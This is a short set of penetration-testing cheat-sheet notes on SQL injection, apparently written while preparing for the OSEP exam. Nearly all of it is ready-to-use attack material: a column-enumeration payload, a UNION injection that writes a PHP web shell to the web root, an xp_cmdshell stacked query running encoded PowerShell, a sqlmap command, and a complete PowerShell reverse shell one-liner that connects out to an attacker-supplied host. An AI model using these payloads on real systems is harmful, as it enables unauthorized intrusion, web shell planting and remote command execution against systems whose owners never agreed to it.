## SQLi

Enumerate no. of columns for `UNION`-based payload:
```sql
' ORDER BY <Column no. to test>-- //
```

Inject webshell into PHP site via `UNION`:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Example stacked query that worked against a machine:
```sql
'; EXECUTE xp_cmdshell 'powershell -enc JABjAGwAaQBl...AKAApAA==';--
```

For examples of the above and more check out PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

### SQLMap

In OSEP SQLMap is fair game. The methods above still work and may still be handy for probing to acquire the appropriate parameters for SQLMap, but in the end SQLMap is the tool we want:

```bash
sqlmap -u "http://192.168.x.y/loginform.asp?uname=test&psw=asdf" -p uname,psw
```


powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<your_lhost>',<your_lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = '$ ' + $sendback;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"